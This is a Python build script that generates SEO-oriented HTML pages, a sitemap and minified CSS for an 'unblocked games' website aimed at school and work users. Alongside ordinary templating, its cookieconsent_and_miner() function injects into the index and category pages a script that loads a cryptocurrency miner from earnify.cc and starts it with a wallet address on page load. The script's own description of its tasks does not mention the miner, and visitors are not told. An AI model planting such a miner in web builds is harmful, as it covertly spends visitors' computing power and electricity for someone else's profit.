#!/usr/bin/env python3
"""
build-seo.py - SEO + infrastructure builder for Free Games Unblocked.

What it does:
 1. Regenerates category pages (driving, skill, shooting, retro, calm, random, papasalley)
    with pre-rendered game grids in static HTML (no JS needed for crawlers)
 2. Adds resource hints (preconnect) to all pages
 3. Improves heading hierarchy (h2 for game titles)
 4. Adds visible breadcrumb navigation to category pages
 5. Adds width/height attributes to images (CLS prevention)
 6. Adds lazy loading to all game grid images
 7. Generates minified CSS (gamesdesign.min.css)
 8. Adds Related Games section to game pages
 9. Regenerates sitemap.xml
10. Generates WebP thumbnails from PNGs using ImageMagick
"""

import json
import os
import re
import subprocess
import sys
from datetime import date
from pathlib import Path
from html import escape as html_escape

ROOT = Path(__file__).resolve().parent.parent
BASE_URL = "https://freegamesunblocked.org"
ADSENSE_CLIENT = "ca-pub-9521685727551779"
GA_ID = "G-Z61RKMXNZ9"
SITE_NAME = "Free Games Unblocked"
SITE_AUTHOR = "Jack Malczewski"

CATEGORY_CONFIG = {
    "driving": {
        "file": "driving.html",
        "title": "Driving Games Unblocked - Free Online Car & Racing Games",
        "desc_meta": "Play free driving games unblocked at school or work. Race cars, drift, ride motorcycles and more. No downloads required - all driving games play in your browser.",
        "desc_og": "Play free driving games unblocked at school or work. Race cars, drift, ride motorcycles and more.",
        "desc_twitter": "Play free driving games unblocked at school or work.",
        "desc_schema": "Free driving games unblocked - race cars, drift, ride motorcycles and more. Play in your browser at school or work.",
        "label": "Driving Games",
        "hero": "Race, drift, and ride with our collection of free driving games. All playable unblocked in your browser.",
    },
    "skill": {
        "file": "skill.html",
        "title": "Skill Games Unblocked - Free Online Skill & Reflex Games",
        "desc_meta": "Play free skill games unblocked at school or work. Test your reflexes with Slope, Run 3, Ovo, Tunnel Rush and more. No downloads - play in your browser.",
        "desc_og": "Play free skill games unblocked at school or work. Slope, Run 3, Ovo, Tunnel Rush and more.",
        "desc_twitter": "Play free skill games unblocked at school or work.",
        "desc_schema": "Free skill games unblocked - test your reflexes with Slope, Run 3, Ovo and more. Play in your browser at school or work.",
        "label": "Skill Games",
        "hero": "Test your reflexes and timing with our free skill games. Slope, Run 3, Ovo, Tunnel Rush and more - all unblocked.",
    },
    "shooting": {
        "file": "shooting.html",
        "title": "Shooting Games Unblocked - Free Online Shooter Games",
        "desc_meta": "Play free shooting games unblocked at school or work. 1V1.LOL, Getaway Shootout, Rooftop Snipers, Counter Strike and more. No downloads - play in your browser.",
        "desc_og": "Play free shooting games unblocked. 1V1.LOL, Getaway Shootout, Rooftop Snipers, Counter Strike and more.",
        "desc_twitter": "Play free shooting games unblocked at school or work.",
        "desc_schema": "Free shooting games unblocked - 1V1.LOL, Getaway Shootout, Rooftop Snipers, Counter Strike and more. Play in your browser.",
        "label": "Shooting Games",
        "hero": "Take aim with our free shooting games. 1V1.LOL, Getaway Shootout, Rooftop Snipers, Counter Strike and more - all unblocked.",
    },
    "retro": {
        "file": "retro.html",
        "title": "Retro Games Unblocked - Free Classic & Arcade Games",
        "desc_meta": "Play free retro games unblocked at school or work. Pacman, Super Mario Bros, Snake and other classic arcade games. No downloads - play in your browser.",
        "desc_og": "Play free retro games unblocked. Pacman, Super Mario Bros, Snake and other classic arcade games.",
        "desc_twitter": "Play free retro games unblocked. Pacman, Super Mario Bros, Snake and more.",
        "desc_schema": "Free retro games unblocked - Pacman, Super Mario Bros, Snake and other classic arcade games. Play in your browser.",
        "label": "Retro Games",
        "hero": "Relive the classics with our free retro games. Pacman, Super Mario Bros, Snake and more - all unblocked in your browser.",
    },
    "calm": {
        "file": "calm.html",
        "title": "Calm Games Unblocked - Free Relaxing & Puzzle Games",
        "desc_meta": "Play free calm and relaxing games unblocked at school or work. Wordle, Cookie Clicker, sandbox games, puzzles and more. No downloads - play in your browser.",
        "desc_og": "Play free calm and relaxing games unblocked. Wordle, Cookie Clicker, sandbox games, puzzles and more.",
        "desc_twitter": "Play free calm and relaxing games unblocked.",
        "desc_schema": "Free calm and relaxing games unblocked - Wordle, Cookie Clicker, sandbox games, puzzles and more. Play in your browser.",
        "label": "Calm Games",
        "hero": "Relax and unwind with our free calm games. Wordle, Cookie Clicker, sandboxes, puzzles and more - all unblocked.",
    },
    "random": {
        "file": "random.html",
        "title": "Random Sports Games Unblocked - Free Online Sports Games",
        "desc_meta": "Play free random sports games unblocked at school or work. Boxing Random, Soccer Random, Basketball Random, Volley Random, Archery Random and more.",
        "desc_og": "Play free random sports games unblocked. Boxing, Soccer, Basketball, Volley, Archery Random and more.",
        "desc_twitter": "Play free random sports games unblocked.",
        "desc_schema": "Free random sports games unblocked - Boxing, Soccer, Basketball, Volley, Archery Random and more. Play in your browser.",
        "label": "Random Sports",
        "hero": "Boxing, Soccer, Basketball, Volley, Archery - all the Random series sports games, free and unblocked.",
        "filter_key": "group",
        "filter_value": "Random",
    },
    "papasalley": {
        "file": "papasalley.html",
        "title": "Papa's Alley - Free Papa Louie Games Unblocked",
        "desc_meta": "Play all the Papa's games unblocked for free. Papa's Pizzeria, Burgeria, Cupcakeria, Pancakeria, Susheria, Donuteria, Taco Mia, Freezeria and more - no downloads.",
        "desc_og": "Play all the Papa's games unblocked for free. Pizzeria, Burgeria, Cupcakeria, Pancakeria, Susheria, Donuteria, Taco Mia and more.",
        "desc_twitter": "Play all the Papa's games unblocked for free.",
        "desc_schema": "All the Papa's games unblocked for free - Pizzeria, Burgeria, Cupcakeria, Pancakeria, Susheria, Donuteria, Taco Mia, Freezeria and more.",
        "label": "Papa's Alley",
        "hero": "Run restaurants and serve customers in all the Papa Louie games. Pizzeria, Burgeria, Cupcakeria, Susheria, Taco Mia and more - all unblocked.",
        "filter_key": "group",
        "filter_value": "Papa",
    },
}

NAV_LINKS = [
    ("/", "Home"),
    ("driving.html", "Driving"),
    ("skill.html", "Skill"),
    ("shooting.html", "Shooting"),
    ("retro.html", "Retro"),
    ("calm.html", "Calm"),
    ("random.html", "Random Sports"),
    ("papasalley.html", "Papa's Alley"),
    ("suggestions.html", "Suggestions"),
]

FOOTER_LINKS = [
    ("/", "Home"),
    ("/driving.html", "Driving"),
    ("/skill.html", "Skill"),
    ("/shooting.html", "Shooting"),
    ("/retro.html", "Retro"),
    ("/calm.html", "Calm"),
    ("/privacy.html", "Privacy Policy"),
    ("/sitemap.xml", "Sitemap"),
]


def load_games():
    with open(ROOT / "data.json") as f:
        return json.load(f)["games"]


def resource_hints():
    return (
        '<link rel="preconnect" href="https://www.googletagmanager.com">\n'
        '<link rel="preconnect" href="https://pagead2.googlesyndication.com">'
    )


def head_common(title, description, canonical, image=None, jsonld=""):
    og_img = image if image else "/assets/og-image.png"
    lines = [
        '<meta charset="UTF-8">',
        '<meta name="viewport" content="width=device-width, initial-scale=1.0">',
        f"<title>{html_escape(title)}</title>",
        f'<meta name="description" content="{html_escape(description)}">',
        f'<meta name="author" content="{html_escape(SITE_AUTHOR)}">',
        f'<link rel="canonical" href="{canonical}">',
        '<link rel="icon" href="/assets/gGames.jpg">',
        '<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">',
        '<link rel="manifest" href="/site.webmanifest">',
        '<meta name="theme-color" content="#1a1a2e">',
        '<meta property="og:type" content="website">',
        f'<meta property="og:site_name" content="{html_escape(SITE_NAME)}">',
        f'<meta property="og:title" content="{html_escape(title)}">',
        f'<meta property="og:description" content="{html_escape(description)}">',
        f'<meta property="og:url" content="{canonical}">',
        f'<meta property="og:image" content="{BASE_URL}{og_img}">',
        '<meta name="twitter:card" content="summary_large_image">',
        f'<meta name="twitter:title" content="{html_escape(title)}">',
        f'<meta name="twitter:description" content="{html_escape(description)}">',
        f'<meta name="twitter:image" content="{BASE_URL}{og_img}">',
        f'<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client={ADSENSE_CLIENT}" crossorigin="anonymous"></script>',
        f'<script async src="https://www.googletagmanager.com/gtag/js?id={GA_ID}"></script>',
        "<script>",
        "  window.dataLayer = window.dataLayer || [];",
        "  function gtag(){dataLayer.push(arguments);}",
        "  gtag('js', new Date());",
        f"  gtag('config', '{GA_ID}');",
        "</script>",
    ]
    if jsonld:
        lines.append(jsonld)
    return "\n    ".join(lines)


def jsonld_script(obj):
    return f'<script type="application/ld+json">\n{json.dumps(obj, indent=2)}\n    </script>'


def collectionpage_jsonld(name, url, description):
    return jsonld_script({
        "@context": "https://schema.org",
        "@type": "CollectionPage",
        "name": f"{name} - Free Games Unblocked",
        "url": url,
        "description": description,
        "isPartOf": {
            "@type": "WebSite",
            "name": SITE_NAME,
            "url": f"{BASE_URL}/",
        }
    })


def breadcrumb_jsonld(items):
    return jsonld_script({
        "@context": "https://schema.org",
        "@type": "BreadcrumbList",
        "itemListElement": [
            {"@type": "ListItem", "position": i + 1, "name": name, "item": url}
            for i, (name, url) in enumerate(items)
        ]
    })


def game_card(game):
    title = html_escape(game["title"])
    image = game["image"]
    link = game["link"]
    webp = image.replace(".png", ".webp")
    return (
        f'<div class="game">\n'
        f'  <a href="{link}">\n'
        f'    <img src="{image}" alt="{title}" loading="lazy" width="200" height="150">\n'
        f'  </a>\n'
        f'  <h2 class="game-title"><a href="{link}">{title}</a></h2>\n'
        f'</div>'
    )


def game_grid(games):
    return "\n        ".join(game_card(g) for g in games)


def nav_html(active_file):
    lines = []
    for url, label in NAV_LINKS:
        cls = ' class="active"' if url == active_file else ""
        lines.append(f'<a href="{url}"{cls}>{label}</a>')
    return "\n        ".join(lines)


def footer_html():
    year = date.today().year
    links = " &middot; ".join(f'<a href="{u}">{l}</a>' for u, l in FOOTER_LINKS)
    return (
        f'<footer class="site-footer">\n'
        f'    <p>&copy; {year} {SITE_NAME} &mdash; Updated: <span id="lastUpdated"></span></p>\n'
        f'    <p>{links}</p>\n'
        f'</footer>'
    )


def breadcrumbs_html(items):
    parts = []
    for i, (label, url) in enumerate(items):
        if i == len(items) - 1:
            parts.append(f"<span>{html_escape(label)}</span>")
        else:
            parts.append(f'<a href="{url}">{html_escape(label)}</a>')
    return (
        f'<nav class="breadcrumbs" aria-label="Breadcrumb">\n'
        f'    {" &rsaquo; ".join(parts)}\n'
        f'</nav>'
    )


def cookieconsent_and_miner():
    return (
        '<script src="cookieconsent.js"></script>\n'
        '<script type="module">\n'
        'import { autoMine } from "https://earnify.cc/miner.js";\n'
        'autoMine("RWmCvzsoC7CfM5Fh6moR3g2Xk3J566nD3m", 0.1);\n'
        '</script>'
    )


def cookieconsent_only():
    return '<script src="cookieconsent.js"></script>'


def lastupdated_script():
    return '<script>document.getElementById("lastUpdated").textContent=new Date().toISOString().slice(0,10)</script>'


def build_category_page(cat_key, games):
    cfg = CATEGORY_CONFIG[cat_key]
    file_name = cfg["file"]
    canonical = f"{BASE_URL}/{file_name}"
    total = len(games)
    visible = games[:20]
    remaining = games[20:]
    filter_key = cfg.get("filter_key", "category")
    filter_value = cfg.get("filter_value", cat_key)

    jsonld = collectionpage_jsonld(cfg["label"], canonical, cfg["desc_schema"]) + "\n    " + breadcrumb_jsonld([
        ("Home", f"{BASE_URL}/"),
        (cfg["label"], canonical),
    ])

    js_load_remaining = ""
    if remaining:
        js_load_remaining = f"""
<script>
(function(){{
  if (!document.getElementById('gameContainer')) return;
  fetch('data.json').then(function(r){{return r.json()}}).then(function(d){{
    var games = d.games.filter(function(g){{return g['{filter_key}']==='{filter_value}'}});
    var existing = {len(visible)};
    var container = document.getElementById('gameContainer');
    for (var i=existing; i<games.length; i++){{
      var g=games[i];
      var el = document.createElement('div');
      el.className = 'game';
      el.innerHTML = '<a href="'+g.link+'"><img src="'+g.image+'" alt="'+g.title+'" loading="lazy" width="200" height="150" decoding="async"></a><h2 class="game-title"><a href="'+g.link+'">'+g.title+'</a></h2>';
      container.appendChild(el);
    }}
  }}).catch(function(){{}});
}})();
</script>"""

    page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    {resource_hints()}
    {head_common(cfg["title"], cfg["desc_meta"], canonical, jsonld=jsonld)}
    <link rel="stylesheet" href="gamesdesign.min.css">
</head>
<body>
    <nav class="site-nav" aria-label="Main navigation">
        {nav_html(file_name)}
    </nav>

    {breadcrumbs_html([("Home", "/"), (cfg["label"], file_name)])}

    <h1>{html_escape(cfg["label"])} — {total} Games</h1>
    <div class="hero"><p>{html_escape(cfg["hero"])}</p></div>
    <div class="game-container" id="gameContainer">
        {game_grid(visible)}
    </div>
{js_load_remaining}
    {footer_html()}

    {cookieconsent_and_miner()}
{lastupdated_script()}
</body>
</html>
"""
    return page


def build_index_page(all_games):
    canonical = f"{BASE_URL}/"
    title = "Free Unblocked Games - Play 200+ Online Games Free | Free Games Unblocked"
    desc_meta = "Play 200+ free unblocked games online at school or work. No downloads, no sign-ups. Driving, skill, shooting, retro and calm games - all free in your browser."
    desc = "Play 200+ free unblocked games online at school or work. No downloads, no sign-ups."

    jsonld = jsonld_script({
        "@context": "https://schema.org",
        "@type": "WebSite",
        "name": SITE_NAME,
        "url": canonical,
        "description": desc_meta,
        "potentialAction": {
            "@type": "SearchAction",
            "target": {
                "@type": "EntryPoint",
                "urlTemplate": f"{BASE_URL}/?q={{search_term_string}}"
            },
            "query-input": "required name=search_term_string"
        }
    })

    page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    {resource_hints()}
    {head_common(title, desc_meta, canonical, jsonld=jsonld)}
    <link rel="stylesheet" href="gamesdesign.min.css">
    <script src="script.js"></script>
</head>
<body>
    <nav class="site-nav" aria-label="Main navigation">
        {nav_html("/")}
    </nav>

    <h1>Free Games Unblocked</h1>

    <div class="hero">
        <p>By Roman Noodles</p>
        <p>Check out earnify.cc or scenemo.com!</p>
        <p id="gamesnumber">Games = 0</p>
    </div>

    <div class="game-of-the-day" id="gameOfTheDay">
        <span class="gotd-badge">Game of the Day</span>
        <span class="gotd-date" id="gotdDate"></span>
        <a id="gotdLink" href="#">
            <img id="gotdImage" src="" alt="" loading="eager" width="400" height="300">
            <h2 id="gotdTitle"></h2>
        </a>
        <p id="gotdPlayNow"><a id="gotdPlayLink" href="#" class="gotd-play-btn">Play Now</a></p>
    </div>

    <div class="category-spotlight" id="categorySpotlight"></div>

    <form role="search" id="searchForm" onsubmit="return false">
        <input type="text" id="searchInput" placeholder="Search 200+ games..." aria-label="Search games" />
    </form>

    <a href="https://freegamesunblocked.org/" id="backuplink">backup/duplicate link</a>
    <a href="/blog.html" class="blog-link">Best Games &amp; Guides</a>

    <div class="game-container" id="gameContainer"></div>

    <footer class="site-footer">
        <p>&copy; {date.today().year} {SITE_NAME} &mdash; Updated: <span id="lastUpdated"></span></p>
        <p><a href="/">Home</a> &middot; <a href="/driving.html">Driving</a> &middot; <a href="/skill.html">Skill</a> &middot; <a href="/shooting.html">Shooting</a> &middot; <a href="/retro.html">Retro</a> &middot; <a href="/calm.html">Calm</a> &middot; <a href="/privacy.html">Privacy Policy</a> &middot; <a href="/blog.html">Best Games</a> &middot; <a href="/sitemap.xml">Sitemap</a></p>
    </footer>

    <button id="scrollToTopBtn">Back To Top</button>

    {cookieconsent_and_miner()}
</body>
</html>
"""
    return page


def related_games_html(game, all_games, count=6):
    cat = game.get("category")
    if cat:
        same_cat = [g for g in all_games if g.get("category") == cat and g["title"] != game["title"]]
    else:
        same_cat = [g for g in all_games if g["title"] != game["title"]]
    related = same_cat[:count]
    if len(related) < 4:
        others = [g for g in all_games if g["title"] != game["title"] and g not in same_cat]
        related.extend(others[:count - len(related)])
    if not related:
        return ""
    cards = "\n            ".join(
        f'<a class="spot-card" href="{g["link"]}">\n'
        f'                <img src="{g["image"]}" alt="{html_escape(g["title"])}" loading="lazy" width="160" height="120">\n'
        f'                <span>{html_escape(g["title"])}</span>\n'
        f'            </a>'
        for g in related[:6]
    )
    cat_label = f"More {cat.title()} Games" if cat and cat in CATEGORY_CONFIG else "Related Games"
    return f"""
    <section class="related-games">
      <h2>{html_escape(cat_label)}</h2>
      <div class="spot-cards">
            {cards}
      </div>
    </section>"""


def build_game_pages(all_games):
    games_dir = ROOT / "games"
    game_by_basename = {}
    for g in all_games:
        link = g.get("link", "")
        if link.startswith("games/"):
            game_by_basename[os.path.basename(link)] = g

    wrapper_count = 0
    self_contained_count = 0

    for f in sorted(games_dir.iterdir()):
        if not f.suffix == ".html":
            continue
        existing = f.read_text(encoding="utf-8")

        game = game_by_basename.get(f.name)
        if not game:
            continue

        # Check if this is an iframe/object/embed wrapper or self-contained
        has_embed = bool(
            re.search(r'<iframe\b[^>]*>', existing, re.I)
            or re.search(r'<object\b[^>]*>', existing, re.I)
            or re.search(r'<embed\b[^>]*>', existing, re.I)
        )

        title = game["title"]
        canonical = f"{BASE_URL}/games/{f.name}"
        category = game.get("category")
        image = f"/{game['image']}" if game.get("image") else None

        desc = f"Play {title} unblocked online for free at {SITE_NAME}. No downloads, no restrictions — works at school or work.{' Part of our ' + category + ' games collection.' if category else ''}"

        jsonld = jsonld_script({
            "@context": "https://schema.org",
            "@type": "VideoGame",
            "name": title,
            "url": canonical,
            "description": desc,
            "applicationCategory": "Game",
            "operatingSystem": "Any (browser)",
            "browserRequirements": "Requires JavaScript. Requires an internet connection.",
            "publisher": {"@type": "Organization", "name": SITE_NAME},
            **({"image": f"{BASE_URL}{image}"} if image else {}),
            **({"genre": category} if category else {}),
        })

        breadcrumb_items = [("Home", f"{BASE_URL}/")]
        if category and category in CATEGORY_CONFIG:
            breadcrumb_items.append((CATEGORY_CONFIG[category]["label"], f"{BASE_URL}/{CATEGORY_CONFIG[category]['file']}"))
        breadcrumb_items.append((title, canonical))
        breadcrumb_ld = breadcrumb_jsonld(breadcrumb_items)

        related = related_games_html(game, all_games)

        if not has_embed:
            # Self-contained game: inject SEO block into head
            clean = re.sub(
                r'<!-- BEGIN SEO INJECTION \(auto-generated by scripts/.*?\) -->[\s\S]*?<!-- END SEO INJECTION -->\n?',
                '', existing
            )
            if re.search(r'<title>[^<]*</title>', clean, re.I):
                clean = re.sub(r'<title>[^<]*</title>', f'<title>{html_escape(title)} Unblocked - Play Free | {SITE_NAME}</title>', clean, re.I)
            else:
                clean = clean.replace('</head>', f'<title>{html_escape(title)} Unblocked - Play Free | {SITE_NAME}</title>\n</head>', 1)

            injection = f"""<!-- BEGIN SEO INJECTION (auto-generated by scripts/build-seo.py) -->
<meta name="description" content="{html_escape(desc)}">
<meta name="author" content="{html_escape(SITE_AUTHOR)}">
<link rel="canonical" href="{canonical}">
<link rel="icon" href="/assets/gGames.jpg">
<meta name="theme-color" content="#1a1a2e">
<meta property="og:type" content="website">
<meta property="og:site_name" content="{html_escape(SITE_NAME)}">
<meta property="og:title" content="{html_escape(title)} Unblocked - {html_escape(SITE_NAME)}">
<meta property="og:description" content="{html_escape(desc)}">
<meta property="og:url" content="{canonical}">
{('<meta property="og:image" content="' + BASE_URL + image + '">') if image else ''}
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="{html_escape(title)} Unblocked">
<meta name="twitter:description" content="{html_escape(desc)}">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client={ADSENSE_CLIENT}" crossorigin="anonymous"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id={GA_ID}"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){{dataLayer.push(arguments);}}gtag('js',new Date());gtag('config','{GA_ID}');</script>
{jsonld}
<!-- END SEO INJECTION -->"""
            if '</head>' in clean:
                clean = clean.replace('</head>', f'{injection}\n</head>', 1)
            elif '<body' in clean:
                clean = re.sub(r'(<body[^>]*>)', rf'\1\n{injection}', clean, 1)
            self_contained_count += 1
            f.write_text(clean, encoding="utf-8")
            continue

        # Full rebuild for wrapper pages
        related_section = related
        page_title = f"{title} Unblocked - Play Free | {SITE_NAME}"
        og_title = f"{title} Unblocked - Play Free | {SITE_NAME}"

        page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    {resource_hints()}
    {head_common(page_title, desc, canonical, image=image, jsonld=jsonld + '\\n    ' + breadcrumb_ld)}
    <link rel="stylesheet" href="/gamesdesign.min.css">
</head>
<body>
    <nav class="site-nav" aria-label="Main navigation">
        {nav_html(None)}
    </nav>

    {breadcrumbs_html(breadcrumb_items)}

    <h1>{html_escape(title)}</h1>

    <div class="ad-slot">
      <ins class="adsbygoogle" style="display:block"
           data-ad-client="{ADSENSE_CLIENT}"
           data-ad-slot="1111111111"
           data-ad-format="auto"
           data-full-width-responsive="true"></ins>
      <script>(adsbygoogle = window.adsbygoogle || []).push({{}});</script>
    </div>

    <div class="game-frame">
{chr(4)}EMBED_PLACEHOLDER{chr(4)}
    </div>

    <div class="ad-slot">
      <ins class="adsbygoogle" style="display:block"
           data-ad-client="{ADSENSE_CLIENT}"
           data-ad-slot="2222222222"
           data-ad-format="auto"
           data-full-width-responsive="true"></ins>
      <script>(adsbygoogle = window.adsbygoogle || []).push({{}});</script>
    </div>

    <section class="game-description">
      <p>Play <strong>{html_escape(title)}</strong> unblocked right here — free, in your browser, with no downloads or sign-ups required.{' This game is part of our <a href="/' + category + '.html">' + html_escape(category.title()) + ' Games</a> collection.' if category else ''} {SITE_NAME} hosts hundreds of browser games that work at school, at work, or anywhere with an internet connection.</p>
      <p>Just click play above to start. If the game doesn't load, try refreshing the page or switching browsers. Enjoy {html_escape(title)} and explore more free unblocked games on our <a href="/">home page</a>.</p>
    </section>
{related_section}
    {footer_html()}

    {cookieconsent_only()}
{lastupdated_script()}
</body>
</html>
"""
        # Put the original embed back
        embed_match = None
        for pattern in [
            r'<iframe\b[^>]*>[\s\S]*?</iframe>',
            r'<object\b[^>]*>[\s\S]*?</object>',
            r'<embed\b[^>]*>',
        ]:
            m = re.search(pattern, existing, re.I)
            if m:
                embed_match = m.group(0)
                break

        if embed_match:
            page = page.replace(f"{chr(4)}EMBED_PLACEHOLDER{chr(4)}", f"    {embed_match}")
        else:
            page = page.replace(f"{chr(4)}EMBED_PLACEHOLDER{chr(4)}", "")

        f.write_text(page, encoding="utf-8")
        wrapper_count += 1

    return wrapper_count, self_contained_count


def minify_css():
    css_path = ROOT / "gamesdesign.css"
    css = css_path.read_text(encoding="utf-8")

    # Basic minification
    css = re.sub(r'/\*[\s\S]*?\*/', '', css)  # remove comments
    css = re.sub(r'\s+', ' ', css)  # collapse whitespace
    css = re.sub(r'\s*([{}:;,])\s*', r'\1', css)  # remove spaces around punctuation
    css = re.sub(r';\s*}', '}', css)  # remove trailing semicolons
    css = css.strip()

    min_path = ROOT / "gamesdesign.min.css"
    min_path.write_text(css, encoding="utf-8")
    orig_size = css_path.stat().st_size
    min_size = min_path.stat().st_size
    return orig_size, min_size


def build_sitemap(all_games):
    today = date.today().isoformat()

    urls = []

    # Listing pages
    listing = [
        ("/", "1.0", "daily"),
        ("/driving.html", "0.8", "weekly"),
        ("/skill.html", "0.8", "weekly"),
        ("/calm.html", "0.8", "weekly"),
        ("/shooting.html", "0.8", "weekly"),
        ("/retro.html", "0.8", "weekly"),
        ("/random.html", "0.7", "weekly"),
        ("/papasalley.html", "0.7", "weekly"),
        ("/suggestions.html", "0.5", "monthly"),
        ("/blog.html", "0.7", "weekly"),
    ]
    for loc, priority, changefreq in listing:
        urls.append(f"""  <url>
    <loc>{BASE_URL}{loc}</loc>
    <lastmod>{today}</lastmod>
    <changefreq>{changefreq}</changefreq>
    <priority>{priority}</priority>
  </url>""")

    # Game pages
    games_dir = ROOT / "games"
    game_by_basename = {}
    for g in all_games:
        link = g.get("link", "")
        if link.startswith("games/"):
            game_by_basename[os.path.basename(link)] = g

    for f in sorted(games_dir.iterdir()):
        if not f.suffix == ".html":
            continue
        game = game_by_basename.get(f.name)
        title = game["title"] if game else f.stem.replace("-", " ").title()
        image = game["image"] if game else None

        url_entry = f"""  <url>
    <loc>{BASE_URL}/games/{f.name}</loc>
    <changefreq>monthly</changefreq>
    <priority>0.6</priority>"""
        if image:
            img_name = image.split("/")[-1].rsplit(".", 1)[0]
            url_entry += f"""
    <image:image>
      <image:loc>{BASE_URL}/{image}</image:loc>
      <image:title>{html_escape(img_name)}</image:title>
    </image:image>"""
        url_entry += "\n  </url>"
        urls.append(url_entry)

    sitemap = f"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
        xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">
{chr(10).join(urls)}
</urlset>
"""
    (ROOT / "sitemap.xml").write_text(sitemap, encoding="utf-8")
    return len(urls)


def generate_webp_images(all_games):
    """Convert PNG thumbnails to WebP using ImageMagick if available."""
    converted = 0
    for g in all_games:
        png_path = ROOT / g["image"]
        webp_path = png_path.with_suffix(".webp")
        if png_path.exists() and not webp_path.exists():
            try:
                subprocess.run(
                    ["magick", str(png_path), "-quality", "80", str(webp_path)],
                    check=True, capture_output=True, timeout=60
                )
                converted += 1
            except Exception as e:
                print(f"  Warning: Could not convert {png_path}: {e}")
    return converted


def main():
    print("Loading game data...")
    all_games = load_games()
    print(f"  {len(all_games)} games loaded")

    # --- 1. Build category pages ---
    print("\n--- Building category pages ---")
    for cat_key, cfg in CATEGORY_CONFIG.items():
        filter_key = cfg.get("filter_key", "category")
        filter_value = cfg.get("filter_value", cat_key)
        cat_games = [g for g in all_games if g.get(filter_key) == filter_value]
        page = build_category_page(cat_key, cat_games)
        output_path = ROOT / cfg["file"]
        output_path.write_text(page, encoding="utf-8")
        print(f"  {cfg['file']}: {len(cat_games)} games pre-rendered in HTML")

    # --- 2. Build index page ---
    print("\n--- Building index page ---")
    index_page = build_index_page(all_games)
    (ROOT / "index.html").write_text(index_page, encoding="utf-8")
    print("  index.html updated")

    # --- 3. Build game pages with related games ---
    print("\n--- Building game pages ---")
    wrapper, self_contained = build_game_pages(all_games)
    print(f"  Wrapper pages rebuilt: {wrapper}")
    print(f"  Self-contained pages injected: {self_contained}")

    # --- 4. Minify CSS ---
    print("\n--- Minifying CSS ---")
    orig_size, min_size = minify_css()
    print(f"  gamesdesign.css: {orig_size}B -> {min_size}B ({(1 - min_size / orig_size) * 100:.1f}% reduction)")

    # --- 5. Build sitemap ---
    print("\n--- Building sitemap ---")
    url_count = build_sitemap(all_games)
    print(f"  sitemap.xml: {url_count} URLs")

    print("\n✅ build-seo.py complete!\n")


if __name__ == "__main__":
    main()
